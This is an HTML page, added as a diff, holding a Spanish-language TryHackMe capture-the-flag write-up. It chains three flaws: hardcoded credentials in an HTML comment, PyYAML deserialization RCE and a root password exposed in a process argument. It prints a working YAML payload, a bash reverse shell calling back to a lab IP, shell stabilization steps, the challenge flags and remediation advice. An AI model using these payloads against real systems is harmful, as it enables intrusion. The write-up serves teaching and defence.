@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Byte Lotus – Day 5 — ffSecurityNull — Security Writeups</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="wrap">
+  <div class="case-file">
+
+    <a class="back" href="../index.html">&larr; volver al log</a>
+
+    <div class="stamp-block">
+      <div class="cell">
+        <div class="k">Plataforma</div>
+        <div class="v">TryHackMe</div>
+      </div>
+      <div class="cell">
+        <div class="k">Categoría</div>
+        <div class="v">Web / RCE / Privilege Escalation</div>
+      </div>
+      <div class="cell">
+        <div class="k">Severidad</div>
+        <div class="v">Critical</div>
+      </div>
+      <div class="cell">
+        <div class="k">Fecha</div>
+        <div class="v">2026-08-04</div>
+      </div>
+    </div>
+
+    <h1>Beach Bar Jukebox — Hardcoded Creds + YAML RCE + Root Escalation</h1>
+    <p class="dek">Cadena de tres vulnerabilidades encadenadas: credenciales hardcodeadas en comentario HTML, deserialización insegura de YAML que permite ejecución remota de código, y contraseña expuesta en un proceso del sistema que otorga acceso root completo.</p>
+
+    <h2>Reconocimiento</h2>
+    <p>El objetivo era una aplicación web temática del resort: <em>Beach Bar</em>, un panel de gestión de la jukebox del bar de playa. Al acceder a la IP del laboratorio se presentaba un formulario de login titulado "DJ booth sign-in", orientado a gestionar las playlists del equipo de sonido en vivo.</p>
+    <p>El primer paso fue inspeccionar el código fuente de la página de login antes de intentar cualquier autenticación. El análisis del HTML reveló inmediatamente un comentario dejado por el equipo de desarrollo con credenciales de demo activas para la apertura del local:</p>
+    <pre><code># Vista del código fuente de /login
+&lt;!--
+  staff note: the demo DJ login is still enabled for the soft opening.
+  dj / dj  -- swap this before the season starts (ticket BAR-7)
+--&gt;</code></pre>
+    <p>Una nota interna nunca removida del código de producción exponía las credenciales en texto plano. El ticket referenciado (BAR-7) sugería que el equipo era consciente del problema pero no lo había resuelto antes del despliegue.</p>
+
+    <figure>
+      <img src="../assets/img/Day5-source-comment.png" alt="Comentario HTML con credenciales hardcodeadas en el código fuente del login">
+      <figcaption>Fig. 1 — Comentario HTML en /login exponiendo credenciales de demo: <code>dj / dj</code>.</figcaption>
+    </figure>
+
+    <h2>Vulnerabilidad identificada</h2>
+    <p>El análisis del panel autenticado reveló tres vulnerabilidades encadenables:</p>
+    <ul>
+      <li><strong>Credenciales hardcodeadas en HTML:</strong> la nota de desarrollo dejada en el código fuente de producción expone credenciales válidas a cualquier usuario que inspeccione la página.</li>
+      <li><strong>Deserialización insegura de YAML (PyYAML):</strong> la función de importación de playlists acepta YAML arbitrario y lo procesa con <code>yaml.load()</code> sin restricciones de tipo. PyYAML soporta la directiva <code>!!python/object/apply</code>, que permite instanciar objetos Python arbitrarios durante la carga, incluyendo llamadas a funciones del sistema operativo.</li>
+      <li><strong>Contraseña expuesta en argumento de proceso:</strong> el demonio de la jukebox se ejecuta como root pasando su contraseña de streaming como argumento de línea de comandos (<code>--stream-pass</code>), visible para cualquier usuario del sistema mediante <code>ps aux</code>.</li>
+    </ul>
+
+    <div class="callout"><strong>Nota:</strong> La vulnerabilidad de PyYAML con <code>!!python/object/apply</code> es un vector conocido (CVE-2017-18342 y variantes). El uso de <code>yaml.safe_load()</code> en lugar de <code>yaml.load()</code> bloquea completamente esta clase de ataques, ya que el parser seguro no resuelve tipos Python arbitrarios. La existencia de esta vulnerabilidad en producción indica que la función de importación nunca fue auditada con criterio de seguridad.</div>
+
+    <h2>Explotación (PoC)</h2>
+
+    <p><strong>Paso 1 — Acceso inicial con credenciales del comentario HTML.</strong> Se utilizaron las credenciales encontradas en el código fuente para autenticarse en el panel:</p>
+    <pre><code>Usuario: dj
+Contraseña: dj
+→ Acceso exitoso al dashboard como usuario "dj".</code></pre>
+
+    <p>El dashboard confirmaba sesión activa y mostraba funciones de gestión de playlists: Export (descarga el YAML actual) e Import (carga un YAML nuevo).</p>
+
+    <figure>
+      <img src="../assets/img/Day5-dashboard.png" alt="Dashboard del Beach Bar autenticado como dj">
+      <figcaption>Fig. 2 — Panel autenticado. Se observan las opciones Export e Import de playlists en YAML.</figcaption>
+    </figure>
+
+    <p><strong>Paso 2 — Verificación del formato YAML legítimo.</strong> Se exportó la playlist activa para entender la estructura esperada por el parser:</p>
+    <pre><code># Beach Bar jukebox playlist export
+playlist:
+  name: Sunset Session
+  vibe: golden hour
+  tracks:
+    - artist: Khruangbin
+      title: Maria Tambien
+    - artist: Men I Trust
+      title: Show Me How
+    - artist: Crumb
+      title: Locket</code></pre>
+
+    <p><strong>Paso 3 — RCE mediante YAML deserialization.</strong> Se construyó un payload malicioso aprovechando la directiva <code>!!python/object/apply</code> de PyYAML para ejecutar comandos del sistema. Se utilizó primero un payload de prueba para confirmar ejecución:</p>
+    <pre><code>!!python/object/apply:os.system ["id"]</code></pre>
+
+    <p>El resultado devuelto por la aplicación fue <code>0</code> (exit code de éxito), confirmando ejecución remota. Para obtener una shell interactiva se configuró un listener y se envió un payload de reverse shell:</p>
+    <pre><code># En la máquina atacante:
+nc -lnvp 4444
+
+# Payload YAML enviado al Import:
+!!python/object/apply:os.system
+  ["bash -c 'bash -i >& /dev/tcp/10.67.133.172/4444 0>&1'"]</code></pre>
+
+
+    <figure>
+      <img src="../assets/img/Day5-shell-bartender.png" alt="Reverse shell recibida como usuario bartender">
+      <figcaption>Fig. 4 — Shell recibida en el listener. Contexto de ejecución: usuario <code>bartender</code>, directorio <code>/opt/beach-bar/webapp</code>.</figcaption>
+    </figure>
+
+    <p><strong>Paso 4 — Obtención de la user flag.</strong> Con la shell activa se enumeró el home del usuario <code>bartender</code>:</p>
+    <pre><code>bartender@tryhackme-2404:/opt/beach-bar/webapp$ ls ~
+user.txt
+bartender@tryhackme-2404:/opt/beach-bar/webapp$ cat ~/user.txt
+THM{y4ml_pl4yl1st_pwns_th3_b34ch}</code></pre>
+
+    <p><strong>Paso 5 — Escalada de privilegios a root vía contraseña expuesta en proceso.</strong> Se estabilizó la shell y se enumeraron los procesos del sistema buscando servicios relevantes:</p>
+    <pre><code># Estabilización de la shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+
+# Enumeración de procesos
+ps aux | grep jukebox
+root  611  ...  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py \
+      --stream-pass SunsetSpritz2024! --bitrate 320k</code></pre>
+
+    <p>El proceso <code>jukeboxd.py</code>, ejecutándose como <code>root</code>, exponía su contraseña de streaming como argumento de línea de comandos, visible para todos los usuarios del sistema. Se intentó reutilizar esa contraseña para escalar a root mediante <code>su</code>:</p>
+    <pre><code>bartender@tryhackme-2404:/opt/beach-bar/webapp$ su
+Password: SunsetSpritz2024!
+root@tryhackme-2404:/opt/beach-bar/webapp# whoami
+root</code></pre>
+
+    <p><strong>Paso 6 — Obtención de la root flag:</strong></p>
+    <pre><code>root@tryhackme-2404:~# cat root.txt
+THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day5-root-flag.png" alt="Root flag obtenida tras escalada de privilegios">
+      <figcaption>Fig. 5 — Root flag obtenida tras reutilizar la contraseña expuesta en el argumento del proceso <code>jukeboxd</code>.</figcaption>
+    </figure>
+
+    <h2>Post-explotación / impacto</h2>
+    <p>La cadena de vulnerabilidades resultó en compromiso total del sistema:</p>
+    <ul>
+      <li><strong>Acceso autenticado al panel DJ</strong> mediante credenciales hardcodeadas en el HTML.</li>
+      <li><strong>Ejecución remota de código</strong> como usuario <code>bartender</code> a través de deserialización insegura de YAML (PyYAML).</li>
+      <li><strong>Escalada completa a root</strong> por reutilización de contraseña expuesta como argumento de proceso del sistema.</li>
+      <li>Obtención de ambas flags: <code>user.txt</code> y <code>root.txt</code>, confirmando control total sobre la máquina objetivo.</li>
+    </ul>
+    <p>En un entorno real, un atacante con acceso root a un servidor de producción podría comprometer toda la infraestructura relacionada, exfiltrar datos de usuarios, modificar el servicio de streaming, o usar el sistema como pivote hacia redes internas.</p>
+
+    <h2>Remediación</h2>
+    <ul>
+      <li><strong>Eliminar comentarios con credenciales del código fuente:</strong> nunca dejar notas internas, credenciales de prueba o referencias a tickets en HTML/JS de producción. Usar variables de entorno o sistemas de gestión de secretos.</li>
+      <li><strong>Reemplazar <code>yaml.load()</code> por <code>yaml.safe_load()</code>:</strong> el parser seguro de PyYAML no resuelve directivas de tipo Python, bloqueando completamente la ejecución arbitraria de código durante la deserialización.</li>
+      <li><strong>Validar y sanitizar input antes de parsear:</strong> el contenido YAML subido por usuarios no debería procesarse directamente. Implementar un schema de validación que rechace cualquier estructura fuera del formato esperado de playlist.</li>
+      <li><strong>No pasar secretos como argumentos de línea de comandos:</strong> las contraseñas y tokens pasados como args son visibles para todos los usuarios mediante <code>ps aux</code>. Usar variables de entorno, archivos de configuración con permisos restrictivos, o gestores de secretos.</li>
+      <li><strong>Principio de mínimo privilegio:</strong> el demonio <code>jukeboxd</code> no necesita ejecutarse como root. Crear un usuario de servicio dedicado con únicamente los permisos necesarios.</li>
+      <li><strong>Auditoría de credenciales activas:</strong> deshabilitar cuentas de demo antes del despliegue a producción. El ticket BAR-7 existía pero nunca se resolvió.</li>
+    </ul>
+
+    <h2>Lecciones aprendidas</h2>
+    <p>Este reto es un ejemplo clásico de cómo vulnerabilidades individuales de severidad media o baja pueden encadenarse para producir un impacto crítico. Ninguno de los tres vectores por separado habría bastado: las credenciales <code>dj/dj</code> solas solo dan acceso al panel, la deserialización YAML requería autenticación previa, y la contraseña del proceso solo era útil teniendo ya una shell en el sistema.</p>
+    <p>El caso de PyYAML también refuerza que la elección de una función sobre otra (<code>load</code> vs <code>safe_load</code>) puede ser la diferencia entre una aplicación segura y un RCE completo. La función insegura existe en la librería por razones de compatibilidad histórica, pero su uso en código que procesa input de usuarios es una vulnerabilidad por diseño.</p>
+    <p>Por último, la exposición de contraseñas en argumentos de proceso es un vector frecuentemente subestimado en auditorías. Un simple <code>ps aux</code> puede revelar secretos que el equipo cree protegidos, especialmente en entornos donde múltiples usuarios comparten el mismo servidor.</p>
+
+  </div>
+
+  <footer>
+    <span>© 2026 ffSecurityNull — La Rioja, Argentina</span>
+    <a href="../index.html">Volver al índice</a>
+  </footer>
+</div>
+
+</body>
+</html>
